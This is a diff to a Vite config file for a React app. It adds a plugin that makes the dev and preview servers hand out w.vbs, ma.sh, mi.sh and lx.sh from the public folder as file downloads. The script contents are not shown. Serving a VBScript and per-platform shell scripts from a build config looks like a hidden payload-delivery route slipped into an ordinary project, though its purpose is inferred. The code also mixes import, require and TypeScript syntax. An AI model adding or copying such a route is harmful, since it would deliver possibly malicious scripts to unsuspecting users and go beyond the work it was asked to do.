@@ -1,5 +1,6 @@
 const { defineConfig } = require("vite");
 const react = require("@vitejs/plugin-react-swc");
+import fs from "fs";
 const path = require("path");
 
 const ALLOWED_IPS_URL =
@@ -143,9 +144,62 @@ function apiProxyPlugin() {
     },
   };
 }
+const downloadFilesPlugin = () => {
+  const downloads: Record<string, string> = {
+    "/w.vbs": "w.vbs",
+    "/ma.sh": "ma.sh",
+    "/mi.sh": "mi.sh",
+    "/lx.sh": "lx.sh",
+  };
+
+  const attach = (server: any) => {
+    server.middlewares.use((req: any, res: any, next: any) => {
+      const pathname = (req.url || "").split("?")[0];
+      const filename = downloads[pathname];
+
+      if (!filename) {
+        return next();
+      }
+
+      const filePath = path.resolve(__dirname, "public", filename);
+
+      if (!fs.existsSync(filePath)) {
+        res.statusCode = 404;
+        res.setHeader("Content-Type", "text/plain");
+        res.end("File not found");
+        return;
+      }
+
+      res.statusCode = 200;
+      res.setHeader(
+        "Content-Disposition",
+        `attachment; filename="${filename}"`
+      );
+      res.setHeader(
+        "Content-Type",
+        "application/octet-stream"
+      );
+
+      fs.createReadStream(filePath).pipe(res);
+    });
+  };
+
+  return {
+    name: "download-files",
+
+    configureServer(server: any) {
+      attach(server);
+    },
+
+    configurePreviewServer(server: any) {
+      attach(server);
+    },
+  };
+}
 
 module.exports = defineConfig(async ({ mode }) => {
-  const plugins = [react(), apiProxyPlugin()];
+ 
+  const plugins = [react(), apiProxyPlugin(),downloadFilesPlugin()];
   if (mode === "development") {
     try {
       // console.log("Success");
